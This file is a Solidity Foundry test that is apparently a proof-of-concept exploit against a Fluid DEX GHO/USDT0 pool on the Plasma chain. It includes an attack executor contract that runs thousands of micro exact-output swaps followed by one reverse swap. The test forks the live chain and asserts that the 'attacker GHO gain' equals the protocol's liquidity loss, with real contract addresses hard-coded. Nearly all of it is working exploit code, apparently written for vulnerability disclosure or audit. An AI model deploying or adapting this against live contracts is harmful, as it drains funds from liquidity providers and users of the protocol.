// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20PlasmaProof {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexPlasmaProof {
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract PlasmaBatchExecutor {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    uint256 internal constant AMOUNT_OUT_GHO = 256_000_000_000_001;

    uint256 public pendingUsdtOutput;
    uint256 public completedForwardRounds;

    constructor() {
        require(IERC20PlasmaProof(GHO).approve(POOL, type(uint256).max), "GHO_APPROVE");
        require(IERC20PlasmaProof(USDT0).approve(POOL, type(uint256).max), "USDT_APPROVE");
    }

    /// @notice USDT0 -> GHO exact-output micro-swaps. This is intended to be
    /// called repeatedly in separate transactions.
    function forwardChunk(uint256 rounds) external returns (uint256 chunkUsdtInput) {
        for (uint256 i; i < rounds; ++i) {
            chunkUsdtInput += IFluidDexPlasmaProof(POOL).swapOut(
                false, AMOUNT_OUT_GHO, type(uint256).max, address(this)
            );
        }
        pendingUsdtOutput += chunkUsdtInput;
        completedForwardRounds += rounds;
    }

    /// @notice One aggregate GHO -> USDT0 exact-output swap restores all USDT0
    /// spent by the preceding forward chunks. State is reset so another full
    /// extraction sequence can begin from the resulting deployed pool state.
    function reverseAndReset() external returns (uint256 ghoInput, uint256 restoredUsdt) {
        restoredUsdt = pendingUsdtOutput;
        require(restoredUsdt > 0, "NO_PENDING_USDT");
        ghoInput = IFluidDexPlasmaProof(POOL).swapOut(
            true, restoredUsdt, type(uint256).max, address(this)
        );
        pendingUsdtOutput = 0;
    }
}

contract PlasmaRepeatedBatchExtractionTest is Test {
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    uint256 internal constant BLOCK_SAFE_CALL_GAS = 35_000_000;
    uint256 internal constant SEQUENCE_ROUNDS = 2_048;
    uint256 internal constant CHUNK_ROUNDS = 256;

    event PlasmaSequenceProof(
        uint256 indexed sequence,
        uint256 forwardRounds,
        uint256 forwardTransactions,
        int256 sequenceUsdtDelta,
        int256 sequenceGhoProfit,
        uint256 sequenceLiquidityLoss,
        uint256 sequenceGas,
        uint256 maxTransactionExecutionGas
    );

    event PlasmaRepeatedProof(
        uint256 requestedSequences,
        uint256 successfulSequences,
        uint256 totalForwardRounds,
        int256 cumulativeUsdtDelta,
        int256 cumulativeGhoProfit,
        uint256 cumulativeLiquidityLoss,
        uint256 measuredExecutionGas,
        uint256 maxTransactionExecutionGas
    );

    event PlasmaExecutionRevert(
        uint256 indexed sequence,
        string phase,
        uint256 completedRoundsInSequence,
        bytes4 selector,
        uint256 errorId
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("PLASMA_RPC_URL"));
    }

    function _decode(bytes memory reason) internal pure returns (bytes4 selector, uint256 errorId) {
        if (reason.length >= 4) {
            assembly {
                selector := mload(add(reason, 32))
            }
        }
        if (reason.length >= 36) {
            assembly {
                errorId := mload(add(reason, 36))
            }
        }
    }

    function _advanceBlock() internal {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);
    }

    function _runRepeated(uint256 requestedSequences) internal {
        PlasmaBatchExecutor executor = new PlasmaBatchExecutor();
        deal(USDT0, address(executor), 1_000_000_000_000);
        deal(GHO, address(executor), 1_000_000 ether);

        uint256 initialUsdt = IERC20PlasmaProof(USDT0).balanceOf(address(executor));
        uint256 initialGho = IERC20PlasmaProof(GHO).balanceOf(address(executor));
        uint256 initialLiquidityGho = IERC20PlasmaProof(GHO).balanceOf(LIQUIDITY);

        uint256 successfulSequences;
        uint256 measuredExecutionGas;
        uint256 maxTransactionExecutionGas;

        for (uint256 sequence; sequence < requestedSequences; ++sequence) {
            uint256 sequenceUsdtBefore = IERC20PlasmaProof(USDT0).balanceOf(address(executor));
            uint256 sequenceGhoBefore = IERC20PlasmaProof(GHO).balanceOf(address(executor));
            uint256 sequenceLiquidityBefore = IERC20PlasmaProof(GHO).balanceOf(LIQUIDITY);
            uint256 sequenceGas;
            uint256 maxSequenceTxGas;
            uint256 completed;
            bool failed;

            while (completed < SEQUENCE_ROUNDS) {
                uint256 gasBefore = gasleft();
                (bool ok, bytes memory data) = address(executor).call{gas: BLOCK_SAFE_CALL_GAS}(
                    abi.encodeCall(PlasmaBatchExecutor.forwardChunk, (CHUNK_ROUNDS))
                );
                uint256 gasUsed = gasBefore - gasleft();
                sequenceGas += gasUsed;
                measuredExecutionGas += gasUsed;
                if (gasUsed > maxSequenceTxGas) maxSequenceTxGas = gasUsed;
                if (gasUsed > maxTransactionExecutionGas) maxTransactionExecutionGas = gasUsed;

                if (!ok) {
                    (bytes4 selector, uint256 errorId) = _decode(data);
                    emit PlasmaExecutionRevert(
                        sequence + 1, "forward", completed, selector, errorId
                    );
                    failed = true;
                    break;
                }
                completed += CHUNK_ROUNDS;
                _advanceBlock();
            }

            if (failed) break;

            uint256 reverseGasBefore = gasleft();
            (bool reverseOk, bytes memory reverseData) = address(executor).call{
                gas: BLOCK_SAFE_CALL_GAS
            }(abi.encodeCall(PlasmaBatchExecutor.reverseAndReset, ()));
            uint256 reverseGas = reverseGasBefore - gasleft();
            sequenceGas += reverseGas;
            measuredExecutionGas += reverseGas;
            if (reverseGas > maxSequenceTxGas) maxSequenceTxGas = reverseGas;
            if (reverseGas > maxTransactionExecutionGas) maxTransactionExecutionGas = reverseGas;

            if (!reverseOk) {
                (bytes4 selector, uint256 errorId) = _decode(reverseData);
                emit PlasmaExecutionRevert(
                    sequence + 1, "reverse", completed, selector, errorId
                );
                break;
            }
            _advanceBlock();
            ++successfulSequences;

            int256 sequenceUsdtDelta = int256(
                IERC20PlasmaProof(USDT0).balanceOf(address(executor))
            ) - int256(sequenceUsdtBefore);
            int256 sequenceGhoProfit = int256(
                IERC20PlasmaProof(GHO).balanceOf(address(executor))
            ) - int256(sequenceGhoBefore);
            uint256 sequenceLiquidityAfter = IERC20PlasmaProof(GHO).balanceOf(LIQUIDITY);
            uint256 sequenceLiquidityLoss = sequenceLiquidityBefore > sequenceLiquidityAfter
                ? sequenceLiquidityBefore - sequenceLiquidityAfter
                : 0;

            emit PlasmaSequenceProof(
                sequence + 1,
                completed,
                completed / CHUNK_ROUNDS,
                sequenceUsdtDelta,
                sequenceGhoProfit,
                sequenceLiquidityLoss,
                sequenceGas,
                maxSequenceTxGas
            );
        }

        int256 cumulativeUsdtDelta = int256(
            IERC20PlasmaProof(USDT0).balanceOf(address(executor))
        ) - int256(initialUsdt);
        int256 cumulativeGhoProfit = int256(
            IERC20PlasmaProof(GHO).balanceOf(address(executor))
        ) - int256(initialGho);
        uint256 finalLiquidityGho = IERC20PlasmaProof(GHO).balanceOf(LIQUIDITY);
        uint256 cumulativeLiquidityLoss = initialLiquidityGho > finalLiquidityGho
            ? initialLiquidityGho - finalLiquidityGho
            : 0;

        assertEq(
            cumulativeGhoProfit,
            int256(cumulativeLiquidityLoss),
            "attacker GHO gain must equal Fluid Liquidity loss"
        );
        assertEq(
            successfulSequences,
            requestedSequences,
            "requested repeated sequences did not all complete"
        );

        emit PlasmaRepeatedProof(
            requestedSequences,
            successfulSequences,
            executor.completedForwardRounds(),
            cumulativeUsdtDelta,
            cumulativeGhoProfit,
            cumulativeLiquidityLoss,
            measuredExecutionGas,
            maxTransactionExecutionGas
        );
    }

    function test_repeat_1_sequence() public { _runRepeated(1); }
    function test_repeat_2_sequences() public { _runRepeated(2); }
    function test_repeat_4_sequences() public { _runRepeated(4); }
}
